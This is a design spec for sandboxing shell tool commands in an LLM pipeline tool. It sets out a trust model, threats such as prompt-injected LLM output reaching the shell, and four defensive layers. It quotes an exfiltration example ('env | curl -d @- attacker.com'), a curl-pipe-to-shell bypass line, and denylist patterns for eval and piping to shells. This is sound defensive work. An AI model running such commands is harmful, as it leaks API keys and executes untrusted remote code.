# Tool Command Sandboxing — Design Spec (v2, post-review)

**Date:** 2026-04-03
**Issue:** #16 (P0 critical, security)
**Scope:** Four defense-in-depth layers for tool_command execution safety
**Reviewed by:** 6-expert security panel. Key changes from v1: inverted taint model, denylist non-overridable by .dip, env var stripping, `human_response` reclassified as safe.

---

## Trust Model

Explicitly stated so future developers can reason about trust boundaries:

- **CLI user** — fully trusted. CLI flags (`--tool-allowlist`, `--max-output-limit`) override everything.
- **.dip file author** — partially trusted. Can define commands and allowlists, but the denylist constrains them. Graph attrs cannot override security controls.
- **LLM output** — untrusted. Context keys populated by agent sessions are tainted.
- **Human gate input** — trusted (local user at keyboard). `human_response` and `interview_answers` are NOT tainted.
- **Pipeline context** — mixed trust. Some keys are author/user-controlled, some are LLM-controlled.

---

## Threat Model

### Threat 1: LLM output injection via variable expansion

`ExpandVariables` interpolates `${ctx.last_response}` (LLM output) into tool_command strings. Shell metacharacters in LLM output execute as commands.

**Vector:** Prompt injection or hallucinated output from any upstream agent node.

### Threat 2: Malicious .dip files

.dip files can be distributed (email, download, shared repos). A malicious .dip file can contain arbitrary `tool_command` values.

**Vector:** Social engineering — user runs an untrusted .dip file.

### Threat 3: Unbounded output capture

Tool commands can produce unlimited stdout/stderr, causing OOM.

### Threat 4: Environment variable exfiltration

Tool commands inherit the parent process environment including API keys. A malicious command can exfiltrate `ANTHROPIC_API_KEY`, `OPENAI_API_KEY`, etc.

---

## Layer 1: Safe-Key Allowlist for Variable Expansion

### Design change from v1

v1 used a denylist of tainted keys. The review panel unanimously recommended inverting to an **allowlist of known-safe keys**. This is fail-closed: any new context key is blocked by default until explicitly marked safe.

### Safe keys (allowed in tool_command expansion)

Only these `ctx.*` keys can be expanded in tool_command:

- `outcome` — simple string (success/fail/retry), engine-controlled
- `preferred_label` — edge label, engine-controlled
- `human_response` — local user keyboard input, NOT LLM output
- `interview_answers` — local user interview input, NOT LLM output
- `graph.goal` — pipeline-level goal text, author-controlled

All `graph.*` and `params.*` namespace keys are always safe (author-controlled).

### Blocked keys (everything else in ctx.*)

Any `ctx.*` key not in the safe set is blocked. This includes:
- `last_response` — LLM output
- `tool_stdout`, `tool_stderr` — prior command output
- `response.*` — per-node LLM responses
- `parallel.results` — aggregated branch outcomes with LLM content
- `interview_questions` — LLM-generated questions
- Any future key added by any handler

### Implementation

Integrate the safe-key check **inside the expansion loop** at the point of variable resolution, not as a separate pre-scan. This eliminates parser-differential bypass risk.

In `pipeline/expand.go`, add an `allowedCtxKeys` parameter to the internal `resolveNamespacedVar` function. When expanding in tool_command mode, after resolving a `ctx.*` key but before returning its value, check against the allowlist. If not allowed, return an error:

```
error: tool_command for node "verify" references unsafe variable "${ctx.last_response}" —
LLM/tool output cannot be interpolated into shell commands. Safe keys: outcome,
preferred_label, human_response, interview_answers, graph.goal.
Write output to a file in a prior tool node and read it in your command instead.
```

The tool handler calls `ExpandVariables` with a new `toolCommandMode bool` parameter. All other callers pass `false` (no change to prompt expansion). This adds one bool parameter to the existing signature — simpler than a wrapper function and avoids the pre-scan/expand parser differential.

**Fail-closed:** If `ExpandVariables` returns an error, the tool node MUST fail. The current code pattern that swallows expansion errors and runs the unexpanded command must be changed to hard-fail.

### deep_review.dip migration

`deep_review.dip` line 29 uses `${ctx.human_response}` in a tool_command. Since `human_response` is now classified as safe (user keyboard input), this pipeline continues to work without changes.

---

## Layer 2: Output Size Limits

### Fix

Add a `limitedBuffer` wrapper that caps bytes written. Includes a `sync.Mutex` for thread-safety by contract.

```go
type limitedBuffer struct {
    mu        sync.Mutex
    buf       bytes.Buffer
    limit     int
    truncated bool
}
```

- **Default:** 64KB per stream (stdout and stderr independently)
- **Node attr:** `output_limit` — parsed as integer bytes or with `KB`/`MB` suffix (binary units: 1KB = 1024). Can lower or raise the limit up to the hard ceiling.
- **Hard ceiling:** `MaxOutputLimit = 10 * 1024 * 1024` (10MB). Cannot be overridden by .dip attrs. Only `--max-output-limit` CLI flag can change it. Prevents malicious .dip files from setting `output_limit: 999999999999`.
- **Truncation signal:** When truncated, append `\n...(output truncated at 64KB)` marker. Also set `tool_stdout_truncated=true` / `tool_stderr_truncated=true` in context so downstream edges can route on it.
- **Constant:** `DefaultOutputLimit = 64 * 1024` in `pipeline/handlers/tool.go`.

---

## Layer 3: Command Denylist / Allowlist

### Denylist (always active, non-overridable)

A hardcoded set of dangerous command patterns. **Cannot be overridden by .dip graph attrs or allowlists.** Only the CLI `--bypass-denylist` flag (requiring explicit operator trust) can disable it.

**Default denied patterns (matched per-statement after splitting on `;`, `&&`, `||`, `\n`):**
- `eval *` — arbitrary code execution
- `exec *` — replace process
- `source *` — execute file in current shell
- `. /*` — dot-source with path (avoids false positives on `. ` in other contexts)
- `* | sh`, `* | bash`, `* | zsh` — pipe to shell
- `* | /bin/sh`, `* | /bin/bash` — pipe to shell (path-qualified)
- `* | sh -`, `* | bash -` — pipe to shell (dash variant)
- `curl * | *`, `wget * | *` — download and pipe

**Matching:** Case-insensitive. `*` matches any characters. Applied to **each statement** in the command (split on `;`, `&&`, `||`, newlines), not the full blob. This prevents `make build && curl evil | sh` from evading detection. Check runs on the **final command string** after all modifications (variable expansion, working_dir prepend).

**Documented limitation:** The denylist is a speed bump against common dangerous patterns, NOT a security boundary. Determined attackers can bypass it via path qualification, quoting, language interpreters, etc. The primary security boundary is Layer 1 (safe-key allowlist) which prevents LLM output from reaching the shell at all.

**Behavior:** Denied commands return an actionable error:

```
error: tool_command for node "setup" matches denied pattern "curl * | *" —
this command pattern is blocked for security. Use --bypass-denylist if this
is intentional, or restructure the command to avoid the pattern.
```

### Allowlist (opt-in, additive)

When configured, ONLY allowed commands can run. The allowlist is additive to the denylist — it restricts what's allowed but **never overrides the denylist**.

**Configuration:**
- CLI flag: `--tool-allowlist` — comma-separated patterns. This is the primary configuration mechanism.
- Graph attr: `tool_commands_allow` — comma-separated patterns. Restricts commands further but cannot override the denylist.

**Evaluation order:**
1. Check denylist (always) — reject if matched. **No override possible from .dip.**
2. If allowlist is configured (CLI or graph attr), check allowlist — reject if not matched.
3. Execute command.

---

## Layer 4: Environment Variable Stripping

### Problem (new, from review)

Tool commands inherit the full parent environment including API keys. A command like `env | curl -d @- attacker.com` exfiltrates secrets.

### Fix

Strip sensitive environment variables from the tool subprocess, matching the pattern already used by the Claude Code backend in `backend_claudecode.go`.

**Stripped patterns:**
- `*_API_KEY`
- `*_SECRET`
- `*_TOKEN`
- `*_PASSWORD`
- `ANTHROPIC_API_KEY`, `OPENAI_API_KEY`, `GEMINI_API_KEY` (explicit)

**Implementation:** In the tool handler, build a filtered `cmd.Env` before calling `ExecCommand`. Add `Env []string` field to `ExecCommand` options or a new method.

**Override:** `TRACKER_PASS_ENV=1` environment variable disables stripping (same pattern as `TRACKER_PASS_API_KEYS` for Claude Code backend).

---

## Additional Requirements (from review)

### Audit logging

Log to the JSONL activity log before every tool_command execution:
- The expanded command string
- The allow/deny decision and which pattern matched
- Which variables were expanded (and which were blocked, if any)

### Static analysis / lint rule

Add a lint check (invoked by `tracker validate` and `dippin doctor`) that flags unsafe variable references in tool_command at parse time, before pipeline execution. This gives users feedback before spending API credits.

---

## Files Changed

| File | Changes |
|------|---------|
| `pipeline/expand.go` | Add `toolCommandMode` parameter, safe-key allowlist check inside expansion loop |
| `pipeline/expand_test.go` | Test safe-key blocking, fail-closed behavior |
| `pipeline/handlers/tool.go` | Call ExpandVariables with toolCommandMode=true, fail-closed on error, parse output_limit, check allow/denylist, strip env vars, audit logging |
| `pipeline/handlers/tool_test.go` | Tests for all four layers |
| `pipeline/handlers/tool_safety.go` | New file — denylist patterns, allowlist matching, per-statement splitting, command checking |
| `pipeline/handlers/tool_safety_test.go` | Tests for pattern matching, per-statement splitting, bypass attempts |
| `agent/exec/local.go` | Add `limitedBuffer` with mutex, plumb output limit and env |
| `agent/exec/env.go` | Add `OutputLimit` and `Env` to ExecCommand options |
| `agent/exec/local_test.go` | Test output limiting, env stripping |
| `cmd/tracker/run.go` | `--tool-allowlist`, `--bypass-denylist`, `--max-output-limit` CLI flags |
| `CLAUDE.md` | Update "Tool node safety" section with trust model and safe patterns |

## Non-Goals

- Container/seccomp sandboxing (platform-specific, overkill for now)
- Automatic shell quoting of expanded variables (fragile)
- Network isolation
- .dip file signing/provenance (good idea, separate feature)
- Bash tool (`agent/tools/bash.go`) sandboxing (separate scope — noted for future)
- Making the safe-key set configurable (security should be opinionated)
